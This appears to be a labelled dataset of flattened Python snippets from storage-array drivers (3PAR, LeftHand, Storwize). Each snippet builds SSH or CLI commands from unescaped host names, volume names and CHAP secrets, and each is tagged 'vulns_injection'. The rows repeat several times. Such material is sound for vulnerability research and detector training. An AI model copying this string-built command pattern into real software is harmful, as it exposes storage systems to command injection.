"        self._cli_run('setqos %svvset:%s' %                      (cli_qos_string, vvs_name), None)            self._cli_run('createvvset -add %s %s' % (vvs_name,                                                      volume_name), None)            self._cli_run('createvvset -domain %s %s' % (domain,                                                         vvs_name), None)            self._cli_run('createvvset -add %s %s' % (vvs_name,                                                      volume_name), None)        self._cli_run('setqos -clear vvset:%s' % (vvs_name), None)        self._cli_run('removevvset -f %s' % (vvs_name), None)        self._cli_run('removevvset -f %s %s' % (vvs_name, volume_name), None)",vulns_injection
"        cmd = 'createvvcopy -p %s -online ' % src_name            cmd += '-snp_cpg %s ' % snap_cpg            cmd += '-tpvv '            cmd += cpg + ' '        cmd += dest_name        self._cli_run(cmd, None)",vulns_injection
"        cmd = ""removevv -f %s"" % volume_name        out = self._cli_run(cmd, None)",vulns_injection
"        out = self._cli_run('showhost -d', None)",vulns_injection
"    def _create_3par_fibrechan_host(self, hostname, wwn, domain, persona_id):        out = self.common._cli_run('createhost -persona %s -domain %s %s %s'                                   % (persona_id, domain,                                      hostname, "" "".join(wwn)), None)    def _modify_3par_fibrechan_host(self, hostname, wwn):        out = self.common._cli_run('createhost -add %s %s'                                   % (hostname, "" "".join(wwn)), None)",vulns_injection
"        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \              (persona_id, domain, hostname, iscsi_iqn)        out = self.common._cli_run(cmd, None)        self.common._cli_run('createhost -iscsi -add %s %s'                             % (hostname, iscsi_iqn), None)",vulns_injection
"        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)",vulns_injection
"        result = self.common._cli_run('showvlun -a -showcols Port', None)",vulns_injection
"        cliq_arg_strings = []            cliq_arg_strings.append("" %s=%s"" % (k, v))        cmd = verb + ''.join(cliq_arg_strings)        return self._run_ssh(cmd, check_exit_code)",vulns_injection
"                                 'authmethod chap',",vulns_injection
"                cmd.extend(['authmethod chap', 'username',",vulns_injection
"    def _cmd_to_dict(self, cmd):        arg_list = cmd.split()",vulns_injection
        arg_list = cmd.split(),vulns_injection
"    def _run_ssh(self, command, check_exit_code=True, attempts=1):",vulns_injection
        generator = self._port_conf_generator('svcinfo lsportip'),vulns_injection
            ssh_cmd = 'svcinfo lsnode -delim ! %s' % node['id'],vulns_injection
        ssh_cmd = 'svcinfo lsmdiskgrp -delim ! -nohdr',vulns_injection
            ssh_cmd = 'svcinfo lslicense -delim !',vulns_injection
        ssh_cmd = 'svcinfo lsnode -delim !',vulns_injection
"        ssh_cmd = ('svctask chhost -chapsecret ""%(chap_secret)s"" %(host_name)s'                   % {'chap_secret': chap_secret, 'host_name': host_name})",vulns_injection
        ssh_cmd = 'svcinfo lsiscsiauth -delim !',vulns_injection
            ssh_cmd = 'svcinfo lsfabric -wwpn %s -delim !' % wwpn,vulns_injection
            ssh_cmd = 'svcinfo lshost -delim ! %s' % host,vulns_injection
        ssh_cmd = 'svcinfo lshost -delim !',vulns_injection
"        ssh_cmd = ('svctask mkhost -force %(port1)s -name ""%(host_name)s""' %                   {'port1': port1, 'host_name': host_name})            ssh_cmd = ('svctask addhostport -force %s %s' % (port, host_name))",vulns_injection
        ssh_cmd = 'svcinfo lshostvdiskmap -delim ! %s' % host_name,vulns_injection
"            ssh_cmd = ('svctask mkvdiskhostmap -host %(host_name)s -scsi '                       '%(result_lun)s %(volume_name)s' %                       {'host_name': host_name,                        'result_lun': result_lun,                        'volume_name': volume_name})",vulns_injection
"                ssh_cmd = ssh_cmd.replace('mkvdiskhostmap',                                          'mkvdiskhostmap -force')",vulns_injection
        ssh_cmd = 'svctask rmhost %s ' % host_name,vulns_injection
        cmd = 'svcinfo lsfabric -host %s' % host_name,vulns_injection
"            ssh_cmd = 'svctask rmvdiskhostmap -host %s %s' % \                (host_name, vol_name)",vulns_injection
        ssh_cmd = 'svcinfo lsvdisk -bytes -delim ! %s ' % vdisk_name        ssh_cmd = 'svcinfo lsvdiskfcmappings -nohdr %s' % vdisk_name,vulns_injection
"        autoex = '-autoexpand' if opts['autoexpand'] else ''        easytier = '-easytier on' if opts['easytier'] else '-easytier off'            ssh_cmd_se_opt = ''            ssh_cmd_se_opt = (                '-rsize %(rsize)d%% %(autoex)s -warning %(warn)d%%' %                {'rsize': opts['rsize'],                 'autoex': autoex,                 'warn': opts['warning']})                ssh_cmd_se_opt = ssh_cmd_se_opt + ' -compressed'                ssh_cmd_se_opt = ssh_cmd_se_opt + (                    ' -grainsize %d' % opts['grainsize'])        ssh_cmd = ('svctask mkvdisk -name %(name)s -mdiskgrp %(mdiskgrp)s '                   '-iogrp 0 -size %(size)s -unit '                   '%(unit)s %(easytier)s %(ssh_cmd_se_opt)s'                   % {'name': name,                   'mdiskgrp': self.configuration.storwize_svc_volpool_name,                   'size': size, 'unit': units, 'easytier': easytier,                   'ssh_cmd_se_opt': ssh_cmd_se_opt})",vulns_injection
"        copyflag = '' if full_copy else '-copyrate 0'        fc_map_cli_cmd = ('svctask mkfcmap -source %(src)s -target %(tgt)s '                          '-autodelete %(copyflag)s' %                          {'src': source,                           'tgt': target,                           'copyflag': copyflag})",vulns_injection
"            out, err = self._run_ssh('svctask prestartfcmap %s' % fc_map_id)",vulns_injection
"            out, err = self._run_ssh('svctask startfcmap %s' % fc_map_id)",vulns_injection
        fc_ls_map_cmd = 'svcinfo lsfcmap -filtervalue id=%s -delim !' % \            fc_map_id,vulns_injection
                        ssh_cmd = ('svctask chfcmap -copyrate 50 '                                   '-autodelete on %s' % map_id),vulns_injection
                            self._run_ssh('svctask stopfcmap %s' % map_id)                            self._run_ssh('svctask rmfcmap -force %s' % map_id)                        self._run_ssh('svctask stopfcmap %s' % map_id)                        self._run_ssh('svctask rmfcmap -force %s' % map_id)                        self._run_ssh('svctask rmfcmap -force %s' % map_id),vulns_injection
"        forceflag = '-force' if force else ''        cmd_params = {'frc': forceflag, 'name': name}        ssh_cmd = 'svctask rmvdisk %(frc)s %(name)s' % cmd_params",vulns_injection
"        ssh_cmd = ('svctask expandvdisksize -size %(amt)d -unit gb %(name)s'                   % {'amt': extend_amt, 'name': volume['name']})",vulns_injection
        ssh_cmd = 'svcinfo lssystem -delim !',vulns_injection
        ssh_cmd = 'svcinfo lsmdiskgrp -bytes -delim ! %s' % pool,vulns_injection
        ssh_cmd = '%s -delim !' % cmd,vulns_injection
                    ' command %s') % ssh_cmd),vulns_injection
"                  % {'cmd': ssh_cmd,",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -persona 1 -domain (\'OpenStack\',) '                           'fakehost 123456789012345 123456789054321')",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -persona 1 -domain (\'OpenStack\',) '                           'fakehost 123456789012345 123456789054321')        show_3par_cmd = 'showhost -verbose fakehost.foo'",vulns_injection
        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -add fakehost '                           '123456789012345 123456789054321')        show_host_cmd = 'showhost -verbose fakehost',vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -persona 1 -domain '                           '(\'OpenStack\',) '                           'fakehost iqn.1993-08.org.debian:01:222')",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -persona 1 -domain '                           '(\'OpenStack\',) '                           'fakehost iqn.1993-08.org.debian:01:222')        show_3par_cmd = 'showhost -verbose fakehost.foo'",vulns_injection
        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -add fakehost '                           'iqn.1993-08.org.debian:01:222'),vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_vlun_cmd = 'showvlun -a -host fakehost',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname'        show_vlun_cmd = 'showvlun -a -host fakehost'        show_vlun_cmd = 'showvlun -a -showcols Port',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_vlun_cmd = 'showvlun -a -showcols Port',vulns_injection
"        self._cli_run(""setwsapi -sru high"", None)",vulns_injection
"            self._cli_run(""growvv -f %s %sg"" % (volume_name, growth_size),                          None)",vulns_injection
"    def _cli_run(self, verb, cli_args):        cli_arg_strings = []        if cli_args:            for k, v in cli_args.items():                if k == '':                    cli_arg_strings.append("" %s"" % k)                else:                    cli_arg_strings.append("" %s=%s"" % (k, v))        cmd = verb + ''.join(cli_arg_strings)",vulns_injection
"    def _run_ssh(self, command, check_exit=True, attempts=1):",vulns_injection
"        self._cli_run('removehost %s' % hostname, None)        out = self._cli_run('createvlun %s auto %s' % (volume, hostname), None)",vulns_injection
"        out = self._cli_run('showhost -verbose %s' % (hostname), None)",vulns_injection
"        out = self._cli_run('showport', None)",vulns_injection
"        out = self._cli_run('showport -iscsi', None)",vulns_injection
"        result = self._cli_run('showport -iscsiname', None)",vulns_injection
"        self._cli_run('setqos %svvset:%s' %                      (cli_qos_string, vvs_name), None)            self._cli_run('createvvset -add %s %s' % (vvs_name,                                                      volume_name), None)            self._cli_run('createvvset -domain %s %s' % (domain,                                                         vvs_name), None)            self._cli_run('createvvset -add %s %s' % (vvs_name,                                                      volume_name), None)        self._cli_run('setqos -clear vvset:%s' % (vvs_name), None)        self._cli_run('removevvset -f %s' % (vvs_name), None)        self._cli_run('removevvset -f %s %s' % (vvs_name, volume_name), None)",vulns_injection
"        cmd = 'createvvcopy -p %s -online ' % src_name            cmd += '-snp_cpg %s ' % snap_cpg            cmd += '-tpvv '            cmd += cpg + ' '        cmd += dest_name        self._cli_run(cmd, None)",vulns_injection
"        cmd = ""removevv -f %s"" % volume_name        out = self._cli_run(cmd, None)",vulns_injection
"        out = self._cli_run('showhost -d', None)",vulns_injection
"    def _create_3par_fibrechan_host(self, hostname, wwn, domain, persona_id):        out = self.common._cli_run('createhost -persona %s -domain %s %s %s'                                   % (persona_id, domain,                                      hostname, "" "".join(wwn)), None)    def _modify_3par_fibrechan_host(self, hostname, wwn):        out = self.common._cli_run('createhost -add %s %s'                                   % (hostname, "" "".join(wwn)), None)",vulns_injection
"        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \              (persona_id, domain, hostname, iscsi_iqn)        out = self.common._cli_run(cmd, None)        self.common._cli_run('createhost -iscsi -add %s %s'                             % (hostname, iscsi_iqn), None)",vulns_injection
"        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)",vulns_injection
"        result = self.common._cli_run('showvlun -a -showcols Port', None)",vulns_injection
"        cliq_arg_strings = []            cliq_arg_strings.append("" %s=%s"" % (k, v))        cmd = verb + ''.join(cliq_arg_strings)        return self._run_ssh(cmd, check_exit_code)",vulns_injection
"                                 'authmethod chap',",vulns_injection
"                cmd.extend(['authmethod chap', 'username',",vulns_injection
"    def _cmd_to_dict(self, cmd):        arg_list = cmd.split()",vulns_injection
        arg_list = cmd.split(),vulns_injection
"    def _run_ssh(self, command, check_exit_code=True, attempts=1):",vulns_injection
        generator = self._port_conf_generator('svcinfo lsportip'),vulns_injection
            ssh_cmd = 'svcinfo lsnode -delim ! %s' % node['id'],vulns_injection
        ssh_cmd = 'svcinfo lsmdiskgrp -delim ! -nohdr',vulns_injection
            ssh_cmd = 'svcinfo lslicense -delim !',vulns_injection
        ssh_cmd = 'svcinfo lsnode -delim !',vulns_injection
"        ssh_cmd = ('svctask chhost -chapsecret ""%(chap_secret)s"" %(host_name)s'                   % {'chap_secret': chap_secret, 'host_name': host_name})",vulns_injection
        ssh_cmd = 'svcinfo lsiscsiauth -delim !',vulns_injection
            ssh_cmd = 'svcinfo lsfabric -wwpn %s -delim !' % wwpn,vulns_injection
            ssh_cmd = 'svcinfo lshost -delim ! %s' % host,vulns_injection
        ssh_cmd = 'svcinfo lshost -delim !',vulns_injection
"        ssh_cmd = ('svctask mkhost -force %(port1)s -name ""%(host_name)s""' %                   {'port1': port1, 'host_name': host_name})            ssh_cmd = ('svctask addhostport -force %s %s' % (port, host_name))",vulns_injection
        ssh_cmd = 'svcinfo lshostvdiskmap -delim ! %s' % host_name,vulns_injection
"            ssh_cmd = ('svctask mkvdiskhostmap -host %(host_name)s -scsi '                       '%(result_lun)s %(volume_name)s' %                       {'host_name': host_name,                        'result_lun': result_lun,                        'volume_name': volume_name})",vulns_injection
"                ssh_cmd = ssh_cmd.replace('mkvdiskhostmap',                                          'mkvdiskhostmap -force')",vulns_injection
        ssh_cmd = 'svctask rmhost %s ' % host_name,vulns_injection
        cmd = 'svcinfo lsfabric -host %s' % host_name,vulns_injection
"            ssh_cmd = 'svctask rmvdiskhostmap -host %s %s' % \                (host_name, vol_name)",vulns_injection
        ssh_cmd = 'svcinfo lsvdisk -bytes -delim ! %s ' % vdisk_name        ssh_cmd = 'svcinfo lsvdiskfcmappings -nohdr %s' % vdisk_name,vulns_injection
"        autoex = '-autoexpand' if opts['autoexpand'] else ''        easytier = '-easytier on' if opts['easytier'] else '-easytier off'            ssh_cmd_se_opt = ''            ssh_cmd_se_opt = (                '-rsize %(rsize)d%% %(autoex)s -warning %(warn)d%%' %                {'rsize': opts['rsize'],                 'autoex': autoex,                 'warn': opts['warning']})                ssh_cmd_se_opt = ssh_cmd_se_opt + ' -compressed'                ssh_cmd_se_opt = ssh_cmd_se_opt + (                    ' -grainsize %d' % opts['grainsize'])        ssh_cmd = ('svctask mkvdisk -name %(name)s -mdiskgrp %(mdiskgrp)s '                   '-iogrp 0 -size %(size)s -unit '                   '%(unit)s %(easytier)s %(ssh_cmd_se_opt)s'                   % {'name': name,                   'mdiskgrp': self.configuration.storwize_svc_volpool_name,                   'size': size, 'unit': units, 'easytier': easytier,                   'ssh_cmd_se_opt': ssh_cmd_se_opt})",vulns_injection
"        copyflag = '' if full_copy else '-copyrate 0'        fc_map_cli_cmd = ('svctask mkfcmap -source %(src)s -target %(tgt)s '                          '-autodelete %(copyflag)s' %                          {'src': source,                           'tgt': target,                           'copyflag': copyflag})",vulns_injection
"            out, err = self._run_ssh('svctask prestartfcmap %s' % fc_map_id)",vulns_injection
"            out, err = self._run_ssh('svctask startfcmap %s' % fc_map_id)",vulns_injection
        fc_ls_map_cmd = 'svcinfo lsfcmap -filtervalue id=%s -delim !' % \            fc_map_id,vulns_injection
                        ssh_cmd = ('svctask chfcmap -copyrate 50 '                                   '-autodelete on %s' % map_id),vulns_injection
                            self._run_ssh('svctask stopfcmap %s' % map_id)                            self._run_ssh('svctask rmfcmap -force %s' % map_id)                        self._run_ssh('svctask stopfcmap %s' % map_id)                        self._run_ssh('svctask rmfcmap -force %s' % map_id)                        self._run_ssh('svctask rmfcmap -force %s' % map_id),vulns_injection
"        forceflag = '-force' if force else ''        cmd_params = {'frc': forceflag, 'name': name}        ssh_cmd = 'svctask rmvdisk %(frc)s %(name)s' % cmd_params",vulns_injection
"        ssh_cmd = ('svctask expandvdisksize -size %(amt)d -unit gb %(name)s'                   % {'amt': extend_amt, 'name': volume['name']})",vulns_injection
        ssh_cmd = 'svcinfo lssystem -delim !',vulns_injection
        ssh_cmd = 'svcinfo lsmdiskgrp -bytes -delim ! %s' % pool,vulns_injection
        ssh_cmd = '%s -delim !' % cmd,vulns_injection
                    ' command %s') % ssh_cmd),vulns_injection
"                  % {'cmd': ssh_cmd,",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -persona 1 -domain (\'OpenStack\',) '                           'fakehost 123456789012345 123456789054321')",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -persona 1 -domain (\'OpenStack\',) '                           'fakehost 123456789012345 123456789054321')        show_3par_cmd = 'showhost -verbose fakehost.foo'",vulns_injection
        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -add fakehost '                           '123456789012345 123456789054321')        show_host_cmd = 'showhost -verbose fakehost',vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -persona 1 -domain '                           '(\'OpenStack\',) '                           'fakehost iqn.1993-08.org.debian:01:222')",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -persona 1 -domain '                           '(\'OpenStack\',) '                           'fakehost iqn.1993-08.org.debian:01:222')        show_3par_cmd = 'showhost -verbose fakehost.foo'",vulns_injection
        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -add fakehost '                           'iqn.1993-08.org.debian:01:222'),vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_vlun_cmd = 'showvlun -a -host fakehost',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname'        show_vlun_cmd = 'showvlun -a -host fakehost'        show_vlun_cmd = 'showvlun -a -showcols Port',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_vlun_cmd = 'showvlun -a -showcols Port',vulns_injection
"        self._cli_run(""setwsapi -sru high"", None)",vulns_injection
"            self._cli_run(""growvv -f %s %sg"" % (volume_name, growth_size),                          None)",vulns_injection
"    def _cli_run(self, verb, cli_args):        cli_arg_strings = []        if cli_args:            for k, v in cli_args.items():                if k == '':                    cli_arg_strings.append("" %s"" % k)                else:                    cli_arg_strings.append("" %s=%s"" % (k, v))        cmd = verb + ''.join(cli_arg_strings)",vulns_injection
"    def _run_ssh(self, command, check_exit=True, attempts=1):",vulns_injection
"        self._cli_run('removehost %s' % hostname, None)        out = self._cli_run('createvlun %s auto %s' % (volume, hostname), None)",vulns_injection
"        out = self._cli_run('showhost -verbose %s' % (hostname), None)",vulns_injection
"        out = self._cli_run('showport', None)",vulns_injection
"        out = self._cli_run('showport -iscsi', None)",vulns_injection
"        result = self._cli_run('showport -iscsiname', None)",vulns_injection
"        self._cli_run('setqos %svvset:%s' %                      (cli_qos_string, vvs_name), None)            self._cli_run('createvvset -add %s %s' % (vvs_name,                                                      volume_name), None)            self._cli_run('createvvset -domain %s %s' % (domain,                                                         vvs_name), None)            self._cli_run('createvvset -add %s %s' % (vvs_name,                                                      volume_name), None)        self._cli_run('setqos -clear vvset:%s' % (vvs_name), None)        self._cli_run('removevvset -f %s' % (vvs_name), None)        self._cli_run('removevvset -f %s %s' % (vvs_name, volume_name), None)",vulns_injection
"        cmd = 'createvvcopy -p %s -online ' % src_name            cmd += '-snp_cpg %s ' % snap_cpg            cmd += '-tpvv '            cmd += cpg + ' '        cmd += dest_name        self._cli_run(cmd, None)",vulns_injection
"        cmd = ""removevv -f %s"" % volume_name        out = self._cli_run(cmd, None)",vulns_injection
"        out = self._cli_run('showhost -d', None)",vulns_injection
"    def _create_3par_fibrechan_host(self, hostname, wwn, domain, persona_id):        out = self.common._cli_run('createhost -persona %s -domain %s %s %s'                                   % (persona_id, domain,                                      hostname, "" "".join(wwn)), None)    def _modify_3par_fibrechan_host(self, hostname, wwn):        out = self.common._cli_run('createhost -add %s %s'                                   % (hostname, "" "".join(wwn)), None)",vulns_injection
"        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \              (persona_id, domain, hostname, iscsi_iqn)        out = self.common._cli_run(cmd, None)        self.common._cli_run('createhost -iscsi -add %s %s'                             % (hostname, iscsi_iqn), None)",vulns_injection
"        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)",vulns_injection
"        result = self.common._cli_run('showvlun -a -showcols Port', None)",vulns_injection
"        cliq_arg_strings = []            cliq_arg_strings.append("" %s=%s"" % (k, v))        cmd = verb + ''.join(cliq_arg_strings)        return self._run_ssh(cmd, check_exit_code)",vulns_injection
"                                 'authmethod chap',",vulns_injection
"                cmd.extend(['authmethod chap', 'username',",vulns_injection
"    def _cmd_to_dict(self, cmd):        arg_list = cmd.split()",vulns_injection
        arg_list = cmd.split(),vulns_injection
"    def _run_ssh(self, command, check_exit_code=True, attempts=1):",vulns_injection
        generator = self._port_conf_generator('svcinfo lsportip'),vulns_injection
            ssh_cmd = 'svcinfo lsnode -delim ! %s' % node['id'],vulns_injection
        ssh_cmd = 'svcinfo lsmdiskgrp -delim ! -nohdr',vulns_injection
            ssh_cmd = 'svcinfo lslicense -delim !',vulns_injection
        ssh_cmd = 'svcinfo lsnode -delim !',vulns_injection
"        ssh_cmd = ('svctask chhost -chapsecret ""%(chap_secret)s"" %(host_name)s'                   % {'chap_secret': chap_secret, 'host_name': host_name})",vulns_injection
        ssh_cmd = 'svcinfo lsiscsiauth -delim !',vulns_injection
            ssh_cmd = 'svcinfo lsfabric -wwpn %s -delim !' % wwpn,vulns_injection
            ssh_cmd = 'svcinfo lshost -delim ! %s' % host,vulns_injection
        ssh_cmd = 'svcinfo lshost -delim !',vulns_injection
"        ssh_cmd = ('svctask mkhost -force %(port1)s -name ""%(host_name)s""' %                   {'port1': port1, 'host_name': host_name})            ssh_cmd = ('svctask addhostport -force %s %s' % (port, host_name))",vulns_injection
        ssh_cmd = 'svcinfo lshostvdiskmap -delim ! %s' % host_name,vulns_injection
"            ssh_cmd = ('svctask mkvdiskhostmap -host %(host_name)s -scsi '                       '%(result_lun)s %(volume_name)s' %                       {'host_name': host_name,                        'result_lun': result_lun,                        'volume_name': volume_name})",vulns_injection
"                ssh_cmd = ssh_cmd.replace('mkvdiskhostmap',                                          'mkvdiskhostmap -force')",vulns_injection
        ssh_cmd = 'svctask rmhost %s ' % host_name,vulns_injection
        cmd = 'svcinfo lsfabric -host %s' % host_name,vulns_injection
"            ssh_cmd = 'svctask rmvdiskhostmap -host %s %s' % \                (host_name, vol_name)",vulns_injection
        ssh_cmd = 'svcinfo lsvdisk -bytes -delim ! %s ' % vdisk_name        ssh_cmd = 'svcinfo lsvdiskfcmappings -nohdr %s' % vdisk_name,vulns_injection
"        autoex = '-autoexpand' if opts['autoexpand'] else ''        easytier = '-easytier on' if opts['easytier'] else '-easytier off'            ssh_cmd_se_opt = ''            ssh_cmd_se_opt = (                '-rsize %(rsize)d%% %(autoex)s -warning %(warn)d%%' %                {'rsize': opts['rsize'],                 'autoex': autoex,                 'warn': opts['warning']})                ssh_cmd_se_opt = ssh_cmd_se_opt + ' -compressed'                ssh_cmd_se_opt = ssh_cmd_se_opt + (                    ' -grainsize %d' % opts['grainsize'])        ssh_cmd = ('svctask mkvdisk -name %(name)s -mdiskgrp %(mdiskgrp)s '                   '-iogrp 0 -size %(size)s -unit '                   '%(unit)s %(easytier)s %(ssh_cmd_se_opt)s'                   % {'name': name,                   'mdiskgrp': self.configuration.storwize_svc_volpool_name,                   'size': size, 'unit': units, 'easytier': easytier,                   'ssh_cmd_se_opt': ssh_cmd_se_opt})",vulns_injection
"        copyflag = '' if full_copy else '-copyrate 0'        fc_map_cli_cmd = ('svctask mkfcmap -source %(src)s -target %(tgt)s '                          '-autodelete %(copyflag)s' %                          {'src': source,                           'tgt': target,                           'copyflag': copyflag})",vulns_injection
"            out, err = self._run_ssh('svctask prestartfcmap %s' % fc_map_id)",vulns_injection
"            out, err = self._run_ssh('svctask startfcmap %s' % fc_map_id)",vulns_injection
        fc_ls_map_cmd = 'svcinfo lsfcmap -filtervalue id=%s -delim !' % \            fc_map_id,vulns_injection
                        ssh_cmd = ('svctask chfcmap -copyrate 50 '                                   '-autodelete on %s' % map_id),vulns_injection
                            self._run_ssh('svctask stopfcmap %s' % map_id)                            self._run_ssh('svctask rmfcmap -force %s' % map_id)                        self._run_ssh('svctask stopfcmap %s' % map_id)                        self._run_ssh('svctask rmfcmap -force %s' % map_id)                        self._run_ssh('svctask rmfcmap -force %s' % map_id),vulns_injection
"        forceflag = '-force' if force else ''        cmd_params = {'frc': forceflag, 'name': name}        ssh_cmd = 'svctask rmvdisk %(frc)s %(name)s' % cmd_params",vulns_injection
"        ssh_cmd = ('svctask expandvdisksize -size %(amt)d -unit gb %(name)s'                   % {'amt': extend_amt, 'name': volume['name']})",vulns_injection
        ssh_cmd = 'svcinfo lssystem -delim !',vulns_injection
        ssh_cmd = 'svcinfo lsmdiskgrp -bytes -delim ! %s' % pool,vulns_injection
        ssh_cmd = '%s -delim !' % cmd,vulns_injection
                    ' command %s') % ssh_cmd),vulns_injection
"                  % {'cmd': ssh_cmd,",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -persona 1 -domain (\'OpenStack\',) '                           'fakehost 123456789012345 123456789054321')",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -persona 1 -domain (\'OpenStack\',) '                           'fakehost 123456789012345 123456789054321')        show_3par_cmd = 'showhost -verbose fakehost.foo'",vulns_injection
        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -add fakehost '                           '123456789012345 123456789054321')        show_host_cmd = 'showhost -verbose fakehost',vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -persona 1 -domain '                           '(\'OpenStack\',) '                           'fakehost iqn.1993-08.org.debian:01:222')",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -persona 1 -domain '                           '(\'OpenStack\',) '                           'fakehost iqn.1993-08.org.debian:01:222')        show_3par_cmd = 'showhost -verbose fakehost.foo'",vulns_injection
        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -add fakehost '                           'iqn.1993-08.org.debian:01:222'),vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_vlun_cmd = 'showvlun -a -host fakehost',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname'        show_vlun_cmd = 'showvlun -a -host fakehost'        show_vlun_cmd = 'showvlun -a -showcols Port',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_vlun_cmd = 'showvlun -a -showcols Port',vulns_injection
"        self._cli_run(""setwsapi -sru high"", None)",vulns_injection
"            self._cli_run(""growvv -f %s %sg"" % (volume_name, growth_size),                          None)",vulns_injection
"    def _cli_run(self, verb, cli_args):        cli_arg_strings = []        if cli_args:            for k, v in cli_args.items():                if k == '':                    cli_arg_strings.append("" %s"" % k)                else:                    cli_arg_strings.append("" %s=%s"" % (k, v))        cmd = verb + ''.join(cli_arg_strings)",vulns_injection
"    def _run_ssh(self, command, check_exit=True, attempts=1):",vulns_injection
"        self._cli_run('removehost %s' % hostname, None)        out = self._cli_run('createvlun %s auto %s' % (volume, hostname), None)",vulns_injection
"        out = self._cli_run('showhost -verbose %s' % (hostname), None)",vulns_injection
"        out = self._cli_run('showport', None)",vulns_injection
"        out = self._cli_run('showport -iscsi', None)",vulns_injection
"        result = self._cli_run('showport -iscsiname', None)",vulns_injection
"        self._cli_run('setqos %svvset:%s' %                      (cli_qos_string, vvs_name), None)            self._cli_run('createvvset -add %s %s' % (vvs_name,                                                      volume_name), None)            self._cli_run('createvvset -domain %s %s' % (domain,                                                         vvs_name), None)            self._cli_run('createvvset -add %s %s' % (vvs_name,                                                      volume_name), None)        self._cli_run('setqos -clear vvset:%s' % (vvs_name), None)        self._cli_run('removevvset -f %s' % (vvs_name), None)        self._cli_run('removevvset -f %s %s' % (vvs_name, volume_name), None)",vulns_injection
"        cmd = 'createvvcopy -p %s -online ' % src_name            cmd += '-snp_cpg %s ' % snap_cpg            cmd += '-tpvv '            cmd += cpg + ' '        cmd += dest_name        self._cli_run(cmd, None)",vulns_injection
"        cmd = ""removevv -f %s"" % volume_name        out = self._cli_run(cmd, None)",vulns_injection
"        out = self._cli_run('showhost -d', None)",vulns_injection
"    def _create_3par_fibrechan_host(self, hostname, wwn, domain, persona_id):        out = self.common._cli_run('createhost -persona %s -domain %s %s %s'                                   % (persona_id, domain,                                      hostname, "" "".join(wwn)), None)    def _modify_3par_fibrechan_host(self, hostname, wwn):        out = self.common._cli_run('createhost -add %s %s'                                   % (hostname, "" "".join(wwn)), None)",vulns_injection
"        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \              (persona_id, domain, hostname, iscsi_iqn)        out = self.common._cli_run(cmd, None)        self.common._cli_run('createhost -iscsi -add %s %s'                             % (hostname, iscsi_iqn), None)",vulns_injection
"        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)",vulns_injection
"        result = self.common._cli_run('showvlun -a -showcols Port', None)",vulns_injection
"        cliq_arg_strings = []            cliq_arg_strings.append("" %s=%s"" % (k, v))        cmd = verb + ''.join(cliq_arg_strings)        return self._run_ssh(cmd, check_exit_code)",vulns_injection
"                                 'authmethod chap',",vulns_injection
"                cmd.extend(['authmethod chap', 'username',",vulns_injection
"    def _cmd_to_dict(self, cmd):        arg_list = cmd.split()",vulns_injection
        arg_list = cmd.split(),vulns_injection
"    def _run_ssh(self, command, check_exit_code=True, attempts=1):",vulns_injection
        generator = self._port_conf_generator('svcinfo lsportip'),vulns_injection
            ssh_cmd = 'svcinfo lsnode -delim ! %s' % node['id'],vulns_injection
        ssh_cmd = 'svcinfo lsmdiskgrp -delim ! -nohdr',vulns_injection
